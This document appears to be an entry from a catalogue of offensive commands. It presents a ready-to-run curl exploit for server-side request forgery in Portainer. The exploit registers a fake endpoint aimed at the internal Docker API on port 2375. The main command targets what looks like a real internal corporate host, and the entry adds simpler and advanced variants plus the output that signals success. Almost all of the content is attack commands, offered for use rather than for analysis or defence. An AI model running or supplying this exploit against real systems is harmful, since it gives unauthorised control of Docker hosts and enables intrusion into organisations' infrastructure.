---
data: >-
  curl -X POST 'https://data-07.uberinternal.com:9000/api/endpoints' -H
  'Content-Type: application/json' -H 'Authorization: Bearer
  YOUR_TOKEN_IF_NEEDED' -d
  '{"Name":"FakeEndpoint","Endpoint":"http://127.0.0.1:2375","PublicURL":"","Group":"","Tags":[],"AzureContainerRegistryLogin":false,"KubernetesConfiguration":null,"EdgeAgent":false,"EdgeID":"","EdgeKey":"","DefaultStackNamespace":"","DefaultProjectNamespace":"","Insecure":true}'
tags:
  - ssrf
  - curl
  - api
type: command
executor: bash
platforms:
  - Linux
  - Web
id: c82c14af-8d55-4fcc-aadc-df50f932619e
created_at: '2025-12-14T03:53:38.600Z'
updated_at: '2025-12-14T03:53:38.600Z'
verified: false
validated: true
submitted: true
---
# curl-portainer-ssrf

## Command

```bash
curl -X POST 'https://data-07.uberinternal.com:9000/api/endpoints' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TOKEN_IF_NEEDED' \
  -d '{"Name":"FakeEndpoint","Endpoint":"http://127.0.0.1:2375","PublicURL":"","Group":"","Tags":[],"AzureContainerRegistryLogin":false,"KubernetesConfiguration":null,"EdgeAgent":false,"EdgeID":"","EdgeKey":"","DefaultStackNamespace":"","DefaultProjectNamespace":"","Insecure":true}'
```

## Description

This curl command exploits SSRF in Portainer by posting a malicious endpoint configuration that points to the internal Docker API (http://127.0.0.1:2375). It simulates adding a new endpoint, forcing the server to make an internal request, which bypasses auth if vulnerable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `'https://data-07.uberinternal.com:9000/api/endpoints'` | Target Portainer API endpoint | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON payload header | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN_IF_NEEDED'` | Optional auth token for Portainer | No |
| `-d '{...}'` | JSON payload with SSRF URL in "Endpoint" field | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target:9000/api/endpoints' -H 'Content-Type: application/json' -d '{"Name":"Test","Endpoint":"http://127.0.0.1:2375"}'
```

### Advanced Usage

```bash
curl -X POST 'https://target:9000/api/endpoints' -H 'Content-Type: application/json' -H 'Authorization: Bearer token' -d '{"Name":"Test","Endpoint":"http://localhost:2375","Insecure":true}'
```

## Expected Output

Successful exploitation returns HTTP 200/201 with JSON like {"Id":1,"Name":"FakeEndpoint",...}, confirming internal connection. Errors like 400 indicate validation blocks; Docker data in response signals success.

## Related

- [[Related Procedure: Exploit-SSRF-in-Portainer-for-Docker-API-Access]]
